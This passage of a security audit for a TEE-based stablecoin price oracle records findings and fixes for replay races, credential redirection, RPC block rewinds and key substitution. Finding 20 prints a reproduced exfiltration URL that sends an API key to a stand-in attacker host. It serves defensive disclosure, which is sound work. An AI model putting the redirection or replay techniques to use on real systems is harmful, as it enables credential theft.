- *Operator tooling.* `deploy-store`, `set-endpoints.sh` and `usdxprov` print
  addresses, refs, versions and expiry — nothing secret. `usdxprov build`
  prints metadata about the envelope but never the credential, which exists in
  plaintext only inside the target TEE.

**What remains, recorded rather than leaked.**

1. *HTTP-level error bodies are not vocabulary-controlled.* `decoding action:
   %v`, `decoding fixed data: %v`, the 501 unsupported-op messages and
   `sending response: %v` are formatted with the underlying error. They are
   visible only to the direct HTTP peer (tee-node, the proxy, or a direct
   submitter), never on the two public surfaces, and their content is either
   the caller's own input or public type names. Not a disclosure; recorded so
   nobody assumes the closed-vocabulary property extends to raw HTTP bodies.
2. *`usdxprov` takes the credential (`-value`) and the admin key (`-key`) as
   argv flags*, which are visible in `ps` output and shell history on the
   operator's own machine. Operational exposure rather than a logging one; a
   stdin/env mode would close it.

One inaccuracy was found and corrected during the audit: the `SET_ENDPOINTS`
rejection comment in `provisioning.go` claimed the error detail names hosts;
the `provisioning/store` errors actually carry chain names, thresholds and secret ref
names. No host ever appears, which is the safer direction.

---

## 16. On-chain configuration was advisory, not binding

**Severity: High. Resolved.**

`setEndpoints` published a configuration and emitted `EndpointsSet(teeId,
keccak256(config))`. That recorded what was **sent**. Nothing recorded, or
required, what a machine was actually **running**.

Three ways they diverge, none of which raised anything:

1. **The extension rejected the payload.** `ApplyEndpoints` validates before
   storing, so a malformed config leaves the *previous* one in force — correct
   behaviour, but the chain still shows the new one.
2. **The instruction was never delivered.** FCC is fire-and-forget: no delivery
   guarantee.
3. **Several machines.** `setEndpoints` names one `teeId`, so N machines means N
   calls. A machine that never received its call keeps running stale
   configuration — and `UsdxPriceStore` accepts a signed price from *any*
   registered machine for the extension, so its prices are equally valid.

The third is the sharpest: every machine reports `ready: true`, and nothing
anywhere reveals that they disagree.

**Resolution.** The signed price report now carries `endpointsHash`, and the
store enforces it:

```solidity
// UsdxOracleInstructionSender.setEndpoints — recorded BEFORE dispatch, so a
// machine that never receives the instruction cannot submit either.
expectedConfigHash[_teeId] = keccak256(_config);

// UsdxPriceStore.submitPrice
bytes32 expected = CONFIG_SOURCE.expectedConfigHash(teeId);
if (expected == bytes32(0)) revert NoConfigPublished();
if (endpointsHash != expected) revert StaleConfig();
```

The TEE already signs the report, so it attests its active configuration in the
same signature. A machine running anything other than what was published cannot
submit at all — no monitoring, no human, no off-chain comparison.

This makes a claim readable from chain alone that was previously unsupported:
*this price was computed by attested code, running this exact published
configuration.*

**Implementation detail that matters.** The hash is taken over the **raw payload
bytes as received**, never a re-serialisation of the decoded struct.
`json.Marshal` will not reproduce byte-identical input — key order, whitespace —
so a re-encode could never match `keccak256(_config)` from the transaction. Same
lesson as "carry the body, never re-encode it".

**What it does NOT do.** It does not constrain the owner, who sets both the
configuration and the expected hash and can keep them consistent while pointing
at anything. It closes divergence, not finding 15.

**Also exposed** in `GET /state` as `readiness.endpointsHash`, so an operator can
compare against the `EndpointsSet` event without waiting for a price submission.
That field is a convenience; the enforcement is on-chain.

---

## 19. Concurrent provisioning bypassed the replay defence entirely

**Severity: High. Resolved.**

`provision.Verifier` keeps `lastVersion[ref]` in a plain map and documented
itself as "not safe for concurrent use; the extension serialises handler
invocations, so the caller already holds a lock."

**No such lock existed.** `/action` is an ordinary `net/http` handler, so
tee-node delivering two direct actions at once runs two `ApplySecret`
goroutines. `runtimecfg.Store` took `s.mu` only around the `s.secrets` write,
well after `Verify` had already read and written the version map.

Two consequences, and the second is the serious one:

- **Concurrent map write.** In Go this is a hard runtime throw, not a
  recoverable panic — the process dies. Inside a TEE that is a restart, and
  since credentials are memory-only, a restart drops every secret.
- **The replay defence did not hold.** The version check is read-then-write
  across `Verify`. Run unserialised, every goroutine reads the same old version
  and each concludes it is newer. Measured with the lock removed, **one captured
  envelope submitted 8 times in parallel was accepted 8 times**:

  ```
  --- FAIL: TestApplySecret_ConcurrentReplayAdmitsExactlyOne
      8 of 8 replays accepted, want exactly 1
  ```

  `version` was documented as blocking in-session rollback. Against a parallel
  submitter it blocked nothing. The 15-minute `issuedAt` window still bounded
  the exposure, so an attacker needed an envelope less than 15 minutes old —
  but within that window the defence was bypassable by firing concurrently
  rather than sequentially.

**Resolution.** `runtimecfg.Store` gained a dedicated `applyMu`, held across the
whole of `ApplyEndpoints` and `ApplySecret`, so the verifier is never entered
concurrently.

Two locks rather than one, deliberately. `s.mu` is also taken by `Readiness` and
`Resolve`, and `ApplySecret` makes two tee-node round trips (`TeeID`,
`Decrypt`); holding `s.mu` across those would let a hung `/decrypt` freeze
`GET /state` and every observation. `applyMu` covers the verifier for the whole
call, `s.mu` stays a short-critical-section data lock, and the order is always
`applyMu` → `mu`.

Pinned by `TestApplySecret_ConcurrentReplayAdmitsExactlyOne` (the security
property) and `TestApplySecret_IsSafeUnderConcurrency` (the race, under
`-race`). Both fail with the lock removed. The `Verifier` doc comment now names
`applyMu` as the serialising caller instead of asserting a lock that was never
there.

---

## 20. The owner could redirect the Hex API key into a URL of their choosing

**Severity: High. Resolved.**

Finding 2 rates disclosure of the Hex credential High and hardens
`backing.New()` against redirects to protect it. Finding 15 accepts that the
owner key can name any RPC host. Neither noticed what the two imply together.

`Provider.Secret` is payload-controlled and was looked up in the *same* secret
store that holds the backing credential:

```go
url, err := resolveURL(p.URL, p.Secret, s.secrets[p.Secret])
```

Nothing stopped a `SET_ENDPOINTS` payload naming `hex_api_key` as an RPC
provider's secret. Reproduced against the real decoder:

```
step 1: payload ACCEPTED — hex_api_key is usable as a provider secret
step 2: resolved URL = https://attacker.example/collect/SUPER-SECRET-HEX-KEY
```

Normally that credential travels as an **auth header** to the compiled-in
`HexCashURL` and never leaves it. Through this path it travels in the **URL
path** of a host the payload author chose, on the next observation.

**What this changed about finding 15.** That finding reasons entirely about
price control, and its enforced-list says `{secret}` cannot appear in scheme or
host "so the credential holder cannot change the destination even though the URL
author can" — treating the URL author as trusted with destinations. But the URL
author and the credential holder are different parties by design. The real blast
radius of an owner-key compromise was therefore larger than recorded: not only
can the holder set the price, they can **harvest every provisioned credential**,
including the one finding 2 goes to some length to protect. That strengthens the
case for finding 15's first mitigation (multisig or timelock on the owner).

**Resolution.** `validate()` rejects any provider naming `config.HexAPIKeyRef`
as its secret. This is the `URLSecretRef` / `AuthSecretRef` split of finding 14
enforced at the boundary rather than left to convention, and it matters most for
this ref because it is the one credential whose destination is otherwise pinned
and so not the owner's to choose.

Note this does **not** stop the owner exfiltrating *RPC* credentials — those are
inherently sent to owner-chosen hosts, which is the accepted trade in finding 15.
It closes the cross-purpose case, where a credential issued for a pinned
endpoint is redirected somewhere else entirely.

**Related hardening in the same pass.** `&` was missing from the rejected
credential character set, so a credential substituted into a query *value*
(`?key={secret}`) could append parameters of its own. The set now lives in one
`urlUnsafe` constant used by both checkpoints — `ApplySecret` on arrival and
`resolveURL` at substitution. Two hand-copied security-relevant character sets
was itself the latent bug: the one that drifts is the one that stops matching.

Pinned by `TestSetEndpoints_RejectsBackingCredentialAsProviderSecret`,
`TestApplySecret_RejectsQuerySeparatorOnArrival`, and the `&` case added to
`TestApplySecret_RejectsCredentialThatWouldAlterAURL`.

---

## 21. Truncation froze the feed below par on a rounding artifact

**Severity: Medium.** The feed prints a depeg that has not happened, and — with
the cash source unavailable — publishes nothing at all.

**Measured 5 Aug 2026**, against live sources:

| | value |
| --- | --- |
| supply, Flare + Ethereum + Songbird | 25,452,544.524018 |
| `current_reserves_amount` | 25,452,544.52 |
| B − S | **−0.004018** |
| B / S | 0.9999999998 |

Hex quotes the reserve figure **to the cent**; supply carries 6 decimals on
Flare and Songbird and 18 on Ethereum. The published bond figure is therefore
supply with up to $0.01 of quantisation removed, and it sits below supply for
roughly half of all observations for no economic reason whatsoever.

Under truncation that lands as `99999999` — 0.99999999, a printed depeg caused
entirely by Hex's number formatting. Finding 6's argument (an error that can
only ever understate) is correct, but the quantity it was protecting against
turns out to be $0.004 on a $25.4M float.

**Resolution: round half-up.** `⌊x·10^8 + ½⌋`. The shortfall this can conceal is
bounded by construction at half a unit in the last place — **$0.127** at current
supply, or 5e-9 of the float — while worst-case cent quantisation is $0.0099, so
the artifact is absorbed with a 12× margin. Nothing material is affected: a 1%
depeg still prints as `99000000`, pinned by
`TestCompute_RoundingCannotHideAMaterialShortfall`.

The exact arithmetic is what makes the bound trustworthy. `big.Rat` throughout,
including the ½ — `TestCompute_RoundingBoundaryIsExact` uses a ratio a float64
would push over the boundary and publish as par.

### The cash-less observation rule

The same finding unblocked the availability question. The restricted cash
endpoint has one URL and one credential, and until Hex issues a key there is no
cash figure at all. `oracle.Observe` therefore accepts a nil cash source, and
`price.ComputeWithoutCash` decides what may be published:

> Publish only when the bonds-only price already reaches par. Cash is
> non-negative and the price is capped at par, so if bonds alone reach par then
> the complete computation reaches par too. The published number is provably the
> one a full observation would have produced.

Everything else fails closed with `BackingUnavailable`. This is **not** the
graceful degradation `usdx-oracle-availability.md` argues against, and the
difference is the whole point: degradation would publish `min(1, R_bonds/S)`
whenever cash was missing — at `R_bonds = 0.99·S` that is 0.990 against a true
0.998, dropping exactly the buffer that decides whether a depeg prints, with
nothing in the signed payload to say so. Here that case publishes nothing.

The rule only has teeth because of the rounding change: at 0.9999999998 the
bonds-only price reaches par under rounding and did not under truncation. Cash
at $205,304 is 806,615 units in the last place, six orders of magnitude beyond
what rounding can absorb — so this admits the quantisation artifact and nothing
else. Pinned by `TestComputeWithoutCash_MatchesTheFullComputation`, which asserts
equality against the full formula for every non-negative cash figure.

`GET /state` reports the source as `not_configured` rather than omitting it —
finding 8's rule, applied to a source that is absent by provisioning rather than
by outage. `Readiness.Ready` stays false while the key is missing: a machine that
can answer for only part of the price range must not claim to be provisioned.

---

## 22. `requestPriceUpdate()` could never dispatch: the registry rejects an empty message

**Severity: High.** The instruction path did not work at all. No price could ever
have reached the chain.

Found on Coston2, 5 Aug 2026, the first time the on-chain request path was
exercised end to end. `requestPriceUpdate()` reverted with `0x3b06a1be` —
`MessageEmpty()` — from `TeeExtensionRegistry.sendInstructions`.

The contract passed `message: ""`, because the observation needs nothing from
the caller. The registry requires a non-empty message. The controlled
comparison is clean: `setEndpoints` sends a non-empty config and had been
delivered and applied minutes earlier on the same machine.

**Why it survived until now.** `git log -S` puts the empty message in the
contracts' first commit (`05c1692`). Nothing had ever called it on-chain: the
only caller was `run-test`, which was failing earlier in the flow — it still
JSON-decoded the Phase-2 stub shape, so it never got as far as dispatching a
second instruction against a real machine. Two latent defects hid each other.

The two sides were also in direct contradiction: the registry demands a
non-empty message, and `processGetPrice` rejected *any* non-empty payload with
`UnexpectedPayload` — deliberately, so that no caller could depend on a field
the extension silently drops.

**Resolution: a fixed one-byte request envelope**, `GET_PRICE_REQUEST_V1 =
hex"01"` in the sender, `config.GetPriceRequestV1` in the extension. The handler
requires exactly that value and rejects everything else, so the no-silent-drops
rule survives intact — it is now "exactly this known envelope" rather than
"nothing at all" — and a future envelope version cannot be mistaken for this
one. Pinned by `TestProcessGetPrice_RequiresTheRequestEnvelope`, which covers
empty, a wrong version, a doubled byte and a zero byte, and by conformance
fixtures 01 and 03.

**Incidental, unfixed:** `setExtensionId()` on a freshly deployed sender is
called only by `run-test`, never by a deploy script, so a new sender reverts
`Extension ID is not set.` until someone runs the test tool. It should move into
`pre-build.sh`.

---

## 23. An observation cannot fit in the 2 seconds tee-node allows

**Severity: High.** Every GET_PRICE request timed out; the extension's answer
was discarded before it could be relayed.

Found immediately after finding 22 was fixed — the instruction dispatched, and
the result came back `status 3`:

```
Post "http://localhost:7702/action": context deadline exceeded
```

tee-node gives an extension **2 seconds** to answer any action:

```go
// tee-node@v0.0.18 internal/extension/extension.go
client := http.Client{Timeout: settings.ProxyTimeout}   // const ProxyTimeout = 2 * time.Second
```

It is a `const` in an `internal/` package: not an env var, not a config field,
and unreachable from this module. Measured against live sources on 5 Aug 2026,
from a well-connected host, a complete observation takes **2.0–2.9s** — two
supply rounds across three chains, two Hex fetches, and a signing round trip,
with `HTTPTimeout` alone at 5s per upstream attempt. Inside the container it was
worse. There is no configuration of the synchronous design that fits.

**Resolution: observe on a timer, sign on demand.** `internal/observation/poller` runs
`oracle.Observe` every `ObservationInterval` (2 min) and keeps the latest
result; `GET_PRICE` calls `oracle.Sign`, which binds that observation to the
requesting instruction id — one signing round trip, milliseconds. `oracle.Observe`
no longer signs, and `Observation` carries `EndpointsHash` so a later signature
commits to the configuration in force *when the inputs were read*, not whatever
is current when the request arrives.

**What this does not change.** `observedAt` still means when the inputs were
read; it is simply no longer the instant of the request. Every freshness guard
that still exists survives it — `checkWindow` across inputs, `MaxObservationAge`
on the cache, `maxAge` on the store. (The backing bounds referred to here —
`BackingMaxAge`, later split into `BondsMaxAge` / `CashMaxAge` — were removed on
17 Aug 2026 for an unrelated reason: the sources are event-driven, so age
carries no information about correctness. See
[usdx-oracle-failure-modes.md](usdx-oracle-failure-modes.md).)

**What it adds.** A cache introduces a staleness mode the request-time design did
not have, so `MaxObservationAge` (10 min) bounds it: past that, GET_PRICE
returns `ObservationStale` and publishes nothing, letting the on-chain value age
visibly. At a 2-minute interval that tolerates four consecutive failed
observations. A single failure does **not** discard the cached observation —
one flapping RPC provider must not stop a feed whose price is still fresh —
but health does reflect the failed attempt, which is the only signal an operator
gets while a cached price is still being served.

Two new vocabulary entries, both publishable: `NoObservation` (asked before the
first round completed) and `ObservationStale`. Pinned by
`TestLatest_FailsClosedWhenStale`, `TestReport_DoesNotSignAStaleObservation` and
`TestRecord_FailureKeepsTheLastGoodObservation`.

**Worth raising upstream:** 2 seconds is a tight budget for any extension that
talks to an external source, and it is not discoverable — it presents as a
`status 3` result with a client-timeout string, not as a documented limit.

**Verification status.** The fix is built and covered by unit, conformance and
contract suites, and the latency it removes was measured directly. It has **not
yet been confirmed on-chain**: the Coston2 run stopped before the first
submission because the machine could not reach PRODUCTION — the availability
proof needs the TEE proxy reachable from outside, and the ngrok tunnel fronting
it went down. Everything else on that chain is in place (see the deployment
table in the plan), so the remaining step is a registration, not a code change.

---

## Design decisions recorded while implementing

These are not defects, but they were judgement calls an auditor will want the
reasoning for.

**No exclusion list.** Supply is the plain sum of `totalSupply()` over the
configured contracts, with no `balanceOf` calls and no exclusions. The contract
list *is* the policy. It is pinned in configuration covered by the code hash,
and it must match the basis on which Hex reports reserves — currently the three
live contracts, excluding the pre-migration Ethereum contract (`0x7A48…D56c`,
150,000 USDX). Including it would compare two different populations and publish
a spurious ~0.6% depeg on day one. Adding it later is a one-line config change.

**Quorum-th highest head, not the minimum.** *(Superseded the minimum rule; see
finding 17 below.)* Each provider reports its head, the Quorum-th highest is
taken, and every provider is queried at that explicit number. It names the
highest block at least `Quorum` providers can serve. The original argument for
the minimum — that it is the only choice every provider can serve — was a
liveness argument, and correct as far as it went; it assumed honest heads.

**Identical results, not median.** A read at a fixed block is deterministic, so
two honest providers cannot disagree. Disagreement means one is wrong or lying,
and there is no safe way to average that. Quorum failure aborts the whole
observation.

**Quorum 1 is expressible, deliberately.** Songbird has exactly one working
public RPC (spec §2.8), so a three-provider rule cannot be met there for free.
`Quorum: 1` is a documented acceptance of single-provider risk for that chain's
~4.5% of supply, not an oversight.

**No cosigners on any instruction.** Every instruction this system sends —
`GET_PRICE` and `SET_ENDPOINTS` in `InstructionSender`, the provisioning
envelope dispatched by `usdxprov`, and the `set-endpoints.sh` payload — goes
out with an empty `cosigners` list and `cosignersThreshold` 0. The machine
executes on delivery; no external address has to co-sign first. This is the
default state, recorded so changing it later is a documented decision. If
cosigners are ever added — e.g. requiring FDC data providers to vouch for a
price-update request before it executes — the change lands in
`InstructionSender` and in those two payloads; the extension and the price
store are untouched, since cosigning gates *delivery/execution*, not the signed
report. The conformance fixtures (then generated by `gen_fixtures.py`, since replaced by `TestConformance`) pin
the empty list and would need regenerating.

**`GET_PRICE` takes no payload.** The observation needs nothing from the
caller: everything it reads is configured by `SET_ENDPOINTS`/`SET_SECRET` or
pinned in the image, and where the signed report lands is settled by the
store's registered-machine check, not by the payload (§16). A non-empty payload
is rejected rather than ignored, so nobody builds on a field the extension
drops — and the rejection does not echo the payload or its length back out,
since `Log` is public.

**Unknown JSON fields are rejected.** A shape change from Hex is a signal to
stop and look, not to keep publishing prices derived from a response we no
longer fully understand.

**Supply is read once per chain, pinned to one agreed block.** Spec §6.1 proposed
a conservative double-read bracketing reserves between two supply reads and
taking `max(S₁, S₂)`, and it shipped that way. It has since been dropped: the
quorum procedure already pins every provider to one block, so a supply figure is
*supply as of block N* rather than a value sampled across the read, and the
reserve figure moves on a ~10 minute tick. The second pass changed the answer
only when a burn or mint landed in the few seconds between two pinned blocks,
while doubling the supply-side fail-closed surface. `TestObserve_ReadsSupplyOncePerChain`
asserts the call count directly, so a reintroduced bracket fails there rather
than showing up as a latency regression. See rationale §2.

**`observedAt` is wall-clock completion time, not the oldest input timestamp.**
The store requires strict monotonicity, and a reserve `last_update` moves only
when a mint or redemption changes the figure — so on a quiet day every
observation for hours would share an input timestamp, and all but the first
would be rejected as a replay. `observedAt` stamps when the inputs were **read**,
which is what `MaxObservationAge` and the store's `maxAge` each bound. How old
the reserve figure itself is, is deliberately unbounded — the sources are
event-driven, so age is not evidence of anything (rationale §2).

**Out-of-band prices are rejected, not clamped.** Clamping would publish a number
the TEE never signed, silently. The signature's entire purpose is that the
published price is the one the attested code computed.

**The feed never reverts, including when paused.** `FtsoV2.getFeedById` forwards
the call, so a revert in `getCurrentFeed()` becomes a simultaneous outage for
every consumer. A pause freezes the value; it does not blind the feed.

---

## Open questions this work did not resolve

- **~~The §3.0 blocker stands~~ — resolved 3 Aug 2026.** `current_reserves_amount`
  is the bank-provider balance of the reserve account; the observed supply-tracking
  is 1:1 treasury operation, not derivation from chain data, and the figure can fall
  below supply on any outflow with no matching burn. `internal/observation/backing` stays an
  interface for source-swap containment. `TestCompute` still encodes the observed
  figures as a par case — correct under 1:1 operations. Written confirmation from
  Hex remains as ordinary diligence.
- **Deviation guard (§6.2)** — still needs a named risk owner. To be implemented
  on-chain, where it can change without a new code hash.
- **Where Confidential Space logs land**, and who can read them (§4.1). Gates how
  much detail internal logging may carry.
- **Feed name and category byte** — to be agreed with Flare before registration.
- **`sourceHealth` granularity** — per-chain vs per-provider, finding 8.
- **~~`agreedBlock` takes the minimum head with no agreement on the head
  itself~~ — resolved 12 Aug 2026, see finding 24.** `agreedBlock` now takes the
  Quorum-th HIGHEST head, so Quorum-1 liars cannot move the block selection, and
  `MaxBlockAge` bounds the chosen block against its own header timestamp for the
  cases the selection rule cannot reach. The note below about Songbird at quorum
  1 still stands and is the live gap: neither change helps a chain configured
  with a single provider, because nothing cross-checks a value only one source
  reported. Fixing that is a configuration change, not a code one.
- **~~Two `coston2.json` fixtures with different schemas~~ — resolved.** The
  stale `go/testdata/endpoints/` tree is gone; `deploy/config/endpoints/` at the repo
  root is the only copy, and it is in the schema the current decoder accepts.
  The underlying hazard is unchanged and worth keeping in mind: publishing a
  payload the extension will reject sets `expectedConfigHash` on-chain while the
  machine keeps its old config, halting the feed on `StaleConfig` until a
  correct one is sent. `send-endpoints -dry-run` decodes before spending gas.

---

## 24. One RPC provider could rewind the observation to an old block

**Severity: High. Resolved 2026-08-12.**

`agreedBlock` took the **minimum** head across providers and required only that
`Quorum` of them answered. Quorum protected the supply *value*; nothing
protected the *block selection*.

So one provider — a hijacked DNS entry, a compromised endpoint, or just a buggy
node — answers "what block are you at?" with a number from two weeks ago. The
minimum wins, every provider is then asked for `totalSupply()` at that old
block, and the honest ones answer **honestly and identically**, because a read
at a fixed block is deterministic. Quorum passes. The TEE signs a stale supply
figure.

The sharp part: the malicious provider never lies about the supply. It lies
about *which question to ask*, and the honest majority corroborates the answer.

**Nothing downstream caught it.** Every other freshness check is wall-clock.
`checkWindow` compares `RetrievedAt` — when the HTTP calls happened — and the
store compares `reportedAt` against `block.timestamp`. Reading ancient data one
second ago passes all of them.

**Direction of error.** Rewinding to when supply was lower understates supply,
which **overstates** the price — the direction mint/redeem dynamics does not
cap.

**Counter-intuitively bounded by retention.** A shallow provider (publicnode
keeps ~64 blocks) simply fails the old-block query, and if enough fail the read
drops below quorum and fails closed. Adding archive-class providers for
reliability quietly *widens* the attack window.

### Resolution — two changes, because neither covers the other

**1. The Quorum-th highest head, not the minimum.** Heads are sorted descending
and the `Quorum`-th is pinned: the highest block at least `Quorum` providers can
serve. Block selection now obeys the same rule as the values it precedes, so
`Quorum-1` liars cannot move it. Providers below the pinned block fail their
calls and do not contribute, which is exactly what `Quorum < len(Providers)`
exists to absorb; they are recorded as `lagging` rather than silently ignored.

This buys nothing when `Quorum == len(Providers)` — the order statistic
degenerates to the minimum — which includes Songbird at quorum 1.

**2. `MaxBlockAge`, a pinned per-chain bound on the pinned block's own header
timestamp.** Flare and Songbird 2 min, Ethereum 3 min. This is the check that
works at any quorum, including one provider, and the only one that notices a
chain that has simply stopped. Sized as a large multiple of normal block age
rather than a tight bound: the attack is a rewind of hours or weeks, so being
generous costs only a little detection latency on a stalled chain, while being
tight would reject healthy observations.

It is **pinned, not configurable**. Letting the owner key that already chooses
the providers (finding 15) also choose how stale a block from them may be would
hand over the check together with the attack.

**The timestamp is voted on.** Taking it from whichever provider proposed the
block would give a liar both halves — an ancient block number paired with a
fresh timestamp — defeating `MaxBlockAge` while the honest providers corroborate
the stale supply at that block. A header at a fixed height is deterministic, so
`Quorum` identical timestamps are required, exactly as for the values.

**Not the removed `FinalityMargin`.** That was a depth *below* the head, dropped
2026-08-11 after measurement showed it bought no availability. `MaxBlockAge`
bounds the *freshness of the chosen block* — a different property, and one that
measurement never covered.

**Not folded into `checkWindow`.** The obvious move is to add the block
timestamp to the observation window, and it is wrong at the current setting:
`ObservationWindow` is 30s and measures read skew between `RetrievedAt` stamps,
while Ethereum's head is routinely 12s or more behind wall-clock. Most of the
budget would go on ordinary block age and healthy observations would flap.
`Reading.BlockTime` is exposed for anything that wants it; `MaxBlockAge` bounds
the quantity directly instead.

---

## 25. Verification proved a key that nothing was encrypted to

**Severity: High. Found 2026-08-15 during an audit of the provisioning flow.
Resolved the same day.**

`verify-tee` is built around the right insight, and its header comment states it
well: reading a code hash out of a proxy's own `/info` proves nothing, because
the same untrusted source supplied both halves. What breaks the circularity is
that the `teeId` is **derived** from the attested public key, and the chain
records which `teeId`s are registered, at what status, and which code hashes
their extension accepts. Substitute the key and the derived `teeId` stops
matching a registered machine.

That argument is sound. It just did not reach the encryption.

`verify-tee` and `usdxprov build` are **separate processes making separate
requests**. The upload scripts ran the first, and then the second re-fetched
`/info` on its own and encrypted the credential to whatever public key came
back — with no attestation parsing, no signature check, and nothing carried over
from the verification that had just passed. An endpoint that served an honest
key to the gate and a substituted one a moment later received the plaintext.

**The `-tee` flag made it worse rather than better.** It was documented as
"override the teeId from `/info`", and it did exactly that: it replaced the
envelope's `TeeID` field while leaving the encryption pointed at the served key.
So passing the *correct* machine id produced a credential encrypted to the
attacker and an envelope naming the honest machine. The target would fail to
decrypt, the upload would look like an ordinary rejection, and nothing anywhere
would record where the plaintext actually went.

### Resolution

`-tee` is now an **assertion, never an override**. `build` derives the address
from the key it was served and refuses outright if it differs, before any
encryption happens — so no ciphertext is produced for a substituted key and no
envelope reaches disk.

`verify-tee` grew `-print-tee-id`, which writes the attested `teeId` to stdout
and moves the human report to stderr. Both upload scripts capture it and pass it
to every `build`. The human report is moved rather than suppressed on purpose:
suppressing it would make the scripted path the one nobody watches.

Nothing was using `-tee` before this change, so tightening it broke no caller.
The `--no-verify` paths pass no `-tee` at all and say plainly that the
encryption is unpinned — they exist for a mocknode, which has no attestation to
pin to.

**What this does not fix.** A credential is still encrypted to a key fetched
over whatever transport the operator names, and the scripts still default
`PROXY_URL` to `http://localhost:8080`. Verification now travels with the
request, which is the load-bearing half; TLS to a real proxy is the other, and
is a deployment property rather than a code one.

---

## 26. `SET_SECRET` was the one provisioning command with no size bound

**Severity: Medium. Found 2026-08-15 during the same audit. Resolved the same
day.**

`ApplyEndpoints` and `ApplyAdmins` both open with a length check against
`maxPayloadBytes`. `ApplySecret` did not, and it is the one that needs it most:
the other two arrive over the instruction channel behind the sender's
owner-only check, while `SET_SECRET` is direct-only and reachable by anyone who
can deliver a direct action.

The work it hands off grows with the input — ABI-decoding the envelope, then
forwarding the ciphertext to tee-node's `/decrypt` — and neither `Verify` nor
`Decrypt` bounded it either. `Verify` caps the signature *count*
(`maxSignatures`) and rejects an empty payload, but never asked how large one
was. A real envelope is a few hundred bytes.

The bound is checked **before `applyMu` is taken**, so an oversized message
cannot hold the provisioning lock while it is being rejected — which would have
turned a size problem into a liveness one against every other provisioning call.

`TestApplySecret_RejectsOversizedMessage` uses a **fully valid** envelope that
is merely too large: correct domain, chain, machine, version, freshness and
signatures. Garbage of the same length proves nothing, since it fails ABI
decoding whether or not the bound exists — only a message that would otherwise
be accepted can tell the two builds apart. The test also re-uses version 1
afterwards, pinning that a rejection this early does not burn the version
number.
